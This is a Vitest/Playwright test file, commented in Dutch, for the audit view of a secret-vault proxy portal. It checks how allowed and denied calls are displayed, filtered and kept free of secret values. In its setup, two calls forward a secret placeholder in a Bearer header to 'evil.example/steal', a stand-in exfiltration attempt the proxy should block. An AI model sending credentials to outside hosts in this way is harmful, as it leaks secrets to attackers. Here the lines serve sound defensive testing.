// De audit, laatste eerst, filter op tool, secret, host en beslissing; geweigerde calls
// gemarkeerd met hun regelnaam; beheer met een eigen stempel en filter; geen waarden.
import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { tempHome, MODES } from '../helpers/journey.js';
import { openBrowser, setupPortal, screenshot, tid, settled } from '../helpers/browser.js';
import { startUpstream } from '../helpers/fakeUpstream.js';
import { fakeSecret, findLeaks } from '../helpers/secretLeak.js';
import { AA, contrast, inBothThemes } from '../helpers/contrast.js';

describe.each(MODES)('portaal: audit, %s', (mode, start) => {
    const value = fakeSecret('audit');
    let proc;
    let b;
    let upstream;
    let key;
    const shots = mode === 'proces';

    beforeAll(async () => {
        upstream = await startUpstream();
        proc = await start(tempHome(), { unlock: false });
        b = await openBrowser();
        await setupPortal(b.page, proc.portal);
        key = await b.page.evaluate(async ({ origin, value }) => {
            const state = await (await globalThis.portalFetch('/api/state')).json();
            const h = { 'content-type': 'application/json', 'x-csrf-token': state.csrf };
            await globalThis.portalFetch('/api/secrets', { method: 'POST', headers: h, body: JSON.stringify({ name: 'demo', value, hosts: [origin] }) });
            const tool = await (await globalThis.portalFetch('/api/tools', { method: 'POST', headers: h, body: JSON.stringify({ name: 'mytool' }) })).json();
            await globalThis.portalFetch('/api/grants', { method: 'POST', headers: h, body: JSON.stringify({ toolId: tool.id, secretName: 'demo', host: origin }) });
            return tool.key;
        }, { origin: upstream.origin, value });
        // toegestane en geweigerde calls: 100 in totaal
        const forward = (url, k = key, name = 'demo') => fetch(`${proc.proxy}/forward/${url}`, { headers: { 'x-vault-gate-tool-key': k, authorization: `Bearer {{secret:${name}}}` } });
        for (let i = 0; i < 94; i++) await forward(`${upstream.origin}/ok${i}`);
        await forward('https://evil.example/steal');
        await forward('https://evil.example/steal2');
        await forward(`${upstream.origin}/x`, 'ks_onbekendeKey123456789012345678901234567890');
        await forward(`${upstream.origin}/x`, key, 'bestaat_niet');
        await forward(`${upstream.origin}/x`, key, 'ook_niet');
        await forward(`${upstream.origin}/last`);
    }, 120_000);

    afterAll(async () => {
        await b?.close();
        await proc?.stop();
        await upstream?.close();
    });

    it('Given 100 beslissingen, waarvan 95 toegestaan When Activity opent Then zijn herhalingen één rij met een aantal en blijven de andere zichtbaar', async () => {
        await tid(b.page, 'tab-audit').click(); await settled(b.page);
        const rows = b.page.locator('[data-testid="audit-row"]');
        // laatste eerst; de 94 toegestane calls na elkaar zijn één rij. De tweede weigering naar evil.example schrijft
        // de proxy later (samengevoegd), dus die staat niet naast de eerste. Daaronder het beheer van de opzet: de passkey,
        // het secret, de tool, de toekenning en de aanrakingen die ze bevestigden.
        expect(await rows.evaluateAll(nodes => nodes.filter(n => n.dataset.decision !== 'admin').length)).toBe(7);
        expect((await rows.first().locator('.rule').textContent()).trim()).toBe('granted');
        expect(await rows.locator('[data-testid="audit-count"]').allTextContents()).toEqual(['×94']);
        // altijd precies één beslissing gekozen; de gebundelde rij kiezen toont rechts hoe vaak en sinds wanneer
        expect(await rows.evaluateAll(nodes => nodes.filter(n => n.getAttribute('aria-selected') === 'true').length)).toBe(1);
        await rows.filter({ has: tid(b.page, 'audit-count') }).click();
        expect(await tid(b.page, 'audit-detail').textContent()).toContain('Same decision 94 times since');
        expect(await tid(b.page, 'audit-intro').textContent()).toContain('1 thing waits for you'); // één passkey: voeg een tweede toe
        expect(await tid(b.page, 'waiting-passkeys-go').textContent()).toBe('Check');
        if (shots) await screenshot(b.page, 'portaal-10-activity');
    });

    it('Given een audit met toegestane en geweigerde calls When gefilterd op "stopped" Then alleen de weigeringen, met regelnaam', async () => {
        await tid(b.page, 'a-decision').selectOption('deny');
        await settled(b.page);
        const rows = b.page.locator('[data-testid="audit-row"]');
        expect(await rows.count()).toBe(5);
        const decisions = await rows.evaluateAll(nodes => nodes.map(node => node.getAttribute('data-decision')));
        expect(decisions).toEqual(['deny', 'deny', 'deny', 'deny', 'deny']);
        const rules = await b.page.locator('[data-testid="audit-row"] .rule').allTextContents();
        expect(rules.sort()).toEqual(['no-tool-key', 'target-host-not-allowed', 'target-host-not-allowed', 'unknown-secret', 'unknown-secret']);
        if (shots) await screenshot(b.page, 'portaal-11-audit-geweigerd');
    });

    it('Given beheer in het portaal When Activity gefilterd op "changes" Then alleen beheer, met eigen stempel, waar en oud → nieuw', async () => {
        await tid(b.page, 'a-decision').selectOption('admin');
        await settled(b.page);
        const rows = b.page.locator('[data-testid="audit-row"]');
        expect(await rows.evaluateAll(nodes => nodes.map(n => n.dataset.decision))).toEqual(expect.arrayContaining(['admin']));
        expect(await rows.evaluateAll(nodes => nodes.every(n => n.dataset.decision === 'admin'))).toBe(true);
        expect(await b.page.locator('[data-testid="audit-row"] .stamp-admin').count()).toBe(await rows.count());
        const detail = tid(b.page, 'audit-detail');
        await rows.filter({ hasText: 'secret-added' }).click();
        expect(await detail.textContent()).toContain('Secret demo was added.');
        expect(await detail.locator('[data-testid="audit-change"]').textContent()).toContain(`in the portal · name: – → demo; hosts: – → ${upstream.origin}`);
        await rows.filter({ hasText: 'grant-added' }).click();
        expect(await detail.textContent()).toContain(`mytool may now use demo on ${upstream.origin}.`);
        expect(await tid(b.page, 'stat-stopped').textContent()).toBe('5'); // beheer telt niet mee
        if (shots) await screenshot(b.page, 'portaal-11b-audit-beheer');
    });

    it('Given een tegengehouden request naar een host buiten de allowlist When die rij gekozen Then toont het detail de regel in waarschuwingskleur, de host als fout in de keten, en haalt alles minstens 4,5:1', async () => {
        await tid(b.page, 'a-decision').selectOption(''); // het filter van de vorige test
        await settled(b.page);
        const row = b.page.locator('[data-testid="audit-row"]').filter({ hasText: 'target-host-not-allowed' }).first();
        expect(await row.getAttribute('data-kind')).toBe('warn');
        await row.click();
        const detail = tid(b.page, 'audit-detail');
        expect(await row.getAttribute('aria-selected')).toBe('true');
        expect((await detail.locator('.reading').textContent()).trim()).toBe('target-host-not-allowed');
        expect(await detail.locator('.reading').getAttribute('class')).toContain('reading-warn');
        expect(await detail.locator('.chain-link.is-bad').textContent()).toContain('evil.example');
        expect(await detail.locator('[data-field="sentence"]').textContent()).toContain('evil.example');
        if (shots) await screenshot(b.page, 'portaal-10b-activity-detail');
        const ratios = await inBothThemes(b.page, async () => ({
            stamp: await contrast(row.locator('.stamp')), reading: await contrast(detail.locator('.reading')),
            sentence: await contrast(detail.locator('[data-field="sentence"]')), fact: await contrast(detail.locator('.facts dt').first()),
        }));
        for (const [theme, r] of Object.entries(ratios)) for (const [part, ratio] of Object.entries(r)) expect(ratio, `${theme} ${part}`).toBeGreaterThanOrEqual(AA);
        // de meting MOET een te zwak contrast afwijzen (grijs op grijs) en zwart op wit als 21:1 zien
        await b.page.evaluate(() => { // via de CSSOM: de CSP van het portaal laat geen style-attributen toe
            for (const [id, color, background] of [['c-low', '#777', '#888'], ['c-max', '#000', '#fff']]) {
                const span = Object.assign(globalThis.document.createElement('span'), { id, textContent: 'x' });
                Object.assign(span.style, { color, background });
                globalThis.document.body.append(span);
            }
        });
        expect(await contrast(b.page.locator('#c-low'))).toBeLessThan(AA);
        expect(await contrast(b.page.locator('#c-max'))).toBeCloseTo(21, 0);
        await b.page.evaluate(() => { for (const id of ['c-low', 'c-max']) globalThis.document.getElementById(id).remove(); });
    });

    it('filter op host en secret (onder Filter)', async () => {
        await tid(b.page, 'a-decision').selectOption('');
        await settled(b.page);
        await tid(b.page, 'a-more').click();
        await tid(b.page, 'a-host').fill('https://evil.example');
        await tid(b.page, 'a-go').click();
        await settled(b.page);
        expect(await b.page.locator('[data-testid="audit-row"]').count()).toBe(1);
        expect(await tid(b.page, 'audit-count').textContent()).toBe('×2');
        await tid(b.page, 'a-more').click();
        await tid(b.page, 'a-host').fill('');
        await tid(b.page, 'a-secret').fill('bestaat_niet');
        await tid(b.page, 'a-go').click();
        await settled(b.page);
        expect(await b.page.locator('[data-testid="audit-row"]').count()).toBe(1);
    });

    it('Given een call zonder toekenning die niet goedgekeurd werd When "Renew grant" in Activity Then opent Grants met tool, secret en domein ingevuld', async () => {
        const other = await b.page.evaluate(async () => {
            const state = await (await globalThis.portalFetch('/api/state')).json();
            const h = { 'content-type': 'application/json', 'x-csrf-token': state.csrf };
            return (await (await globalThis.portalFetch('/api/tools', { method: 'POST', headers: h, body: JSON.stringify({ name: 'nieuw' }) })).json()).key;
        });
        const res = await fetch(`${proc.proxy}/forward/${upstream.origin}/x`, { headers: { 'x-vault-gate-tool-key': other, authorization: 'Bearer {{secret:demo}}' } });
        expect(res.headers.get('x-vault-gate-rule')).toBe('approval-unavailable'); // geen tray: niemand kon goedkeuren
        await tid(b.page, 'a-more').click();
        await tid(b.page, 'a-secret').fill(''); // het filter van de vorige test
        await tid(b.page, 'a-go').click(); await settled(b.page);
        await b.page.locator('[data-testid="audit-row"]').filter({ hasText: 'approval-unavailable' }).first().click();
        await tid(b.page, 'audit-renew').click(); await settled(b.page);
        expect(await tid(b.page, 'tab-grants').getAttribute('aria-current')).toBe('page');
        await tid(b.page, 'g-dialog').waitFor();
        expect(await tid(b.page, 'g-tool').locator('option:checked').textContent()).toBe('nieuw');
        expect(await tid(b.page, 'g-secret').inputValue()).toBe('demo');
        expect(await tid(b.page, 'g-host').inputValue()).toBe(upstream.origin);
        await b.page.keyboard.press('Escape');
    });

    it('Given een tegengehouden request met unknown-secret When "Create secret" in Activity Then opent Secrets dialoog met naam en host ingevuld', async () => {
        await tid(b.page, 'tab-audit').click(); await settled(b.page);
        await b.page.locator('[data-testid="audit-row"]').filter({ hasText: 'unknown-secret' }).first().click();
        await tid(b.page, 'audit-create-secret').click(); await settled(b.page);
        expect(await tid(b.page, 'tab-secrets').getAttribute('aria-current')).toBe('page');
        await tid(b.page, 's-dialog').waitFor();
        expect(await tid(b.page, 's-name').inputValue()).toBe('ook_niet');
        expect(await tid(b.page, 's-hosts').inputValue()).toBe(upstream.origin);
        await b.page.keyboard.press('Escape');
    });

    it('geen waarde in de audit, de pagina of de procesuitvoer (de tool-key staat alleen in het antwoord van het aanmaken)', async () => {
        const creation = /^POST \S+\/api\/tools /;
        expect(b.responses.some(r => creation.test(r) && r.includes(key))).toBe(true);
        const api = b.responses.filter(r => !creation.test(r)).join('\n');
        expect(findLeaks({ page: await b.page.content(), api, out: proc.output() }, [value, key])).toEqual([]);
    });
});
